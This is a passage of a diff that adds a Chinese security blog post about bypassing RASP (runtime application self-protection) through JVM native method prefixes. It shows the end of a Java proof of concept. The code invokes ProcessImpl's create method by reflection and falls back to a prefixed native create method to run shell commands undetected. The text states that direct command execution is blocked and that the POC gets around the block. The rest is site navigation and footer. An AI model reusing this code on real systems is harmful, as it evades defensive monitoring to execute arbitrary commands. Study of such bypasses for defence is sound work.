+</span></span><span class="line"><span class="cl">                String.class, String.class, String.class, long[].class, boolean.class);
+</span></span><span class="line"><span class="cl">        createMethod.setAccessible(true);
+</span></span><span class="line"><span class="cl">        long processHandle = (Long) createMethod.invoke(null, cmd, null, null, stdHandles, redirectErrorStream);
+</span></span><span class="line"><span class="cl">    } catch (Exception e) {
+</span></span><span class="line"><span class="cl">        System.out.println(&#34;[-] reflect create failed,try to bypass&#34;);
+</span></span><span class="line"><span class="cl">        for (Method m : processImplClass.getDeclaredMethods()) {
+</span></span><span class="line"><span class="cl">            if (m.getName().endsWith(&#34;create&#34;) &amp;&amp; !m.getName().equals(&#34;create&#34;)) {
+</span></span><span class="line"><span class="cl">                System.out.println(&#34;[+] get prefix native method : &#34; + m.getName());
+</span></span><span class="line"><span class="cl">                m.setAccessible(true);
+</span></span><span class="line"><span class="cl">                long processHandle = (Long) m.invoke(null, cmd, null, null, stdHandles, redirectErrorStream);
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    FileDescriptor stdout_fd = new FileDescriptor();
+</span></span><span class="line"><span class="cl">    fdAccess.setHandle(stdout_fd, stdHandles[1]);
+</span></span><span class="line"><span class="cl">    InputStream stdout_stream = new BufferedInputStream(
+</span></span><span class="line"><span class="cl">            new FileInputStream(stdout_fd));
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    return getStreamStr(stdout_stream, &#34;GBK&#34;);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>效果</p>
+<p>直接执行命令，会被干掉。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668741179-37a18436-7e4c-4447-a007-b908f0b71145.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668741179-37a18436-7e4c-4447-a007-b908f0b71145.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668741179-37a18436-7e4c-4447-a007-b908f0b71145.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668741179-37a18436-7e4c-4447-a007-b908f0b71145.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668741179-37a18436-7e4c-4447-a007-b908f0b71145.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668741179-37a18436-7e4c-4447-a007-b908f0b71145.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>运行POC，即可绕过。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668900616-d6d81d61-a5f3-414c-835f-7cc428663225.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668900616-d6d81d61-a5f3-414c-835f-7cc428663225.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668900616-d6d81d61-a5f3-414c-835f-7cc428663225.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668900616-d6d81d61-a5f3-414c-835f-7cc428663225.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668900616-d6d81d61-a5f3-414c-835f-7cc428663225.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668900616-d6d81d61-a5f3-414c-835f-7cc428663225.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668886446-00547ed4-fcc0-4a2e-9f9d-c58aa8a45dc9.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668886446-00547ed4-fcc0-4a2e-9f9d-c58aa8a45dc9.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668886446-00547ed4-fcc0-4a2e-9f9d-c58aa8a45dc9.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668886446-00547ed4-fcc0-4a2e-9f9d-c58aa8a45dc9.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668886446-00547ed4-fcc0-4a2e-9f9d-c58aa8a45dc9.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703668886446-00547ed4-fcc0-4a2e-9f9d-c58aa8a45dc9.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-12-28</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/" data-title="Bypass RASP NativeMethodPrefix学习"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/" data-title="Bypass RASP NativeMethodPrefix学习"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/" data-title="Bypass RASP NativeMethodPrefix学习"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/" data-title="Bypass RASP NativeMethodPrefix学习"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/" data-title="Bypass RASP NativeMethodPrefix学习" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;Bypass RASP NativeMethodPrefix学习&#34;, &#34;https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/jvm-hsdb-in-pentest/" class="prev" rel="prev" title="JVM HSDB在后渗透中的利用"><i class="fas fa-angle-left fa-fw"></i>JVM HSDB在后渗透中的利用</a>
+            <a href="/posts/gzh/" class="next" rel="next" title="[置顶] 搞了个公众号">[置顶] 搞了个公众号<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
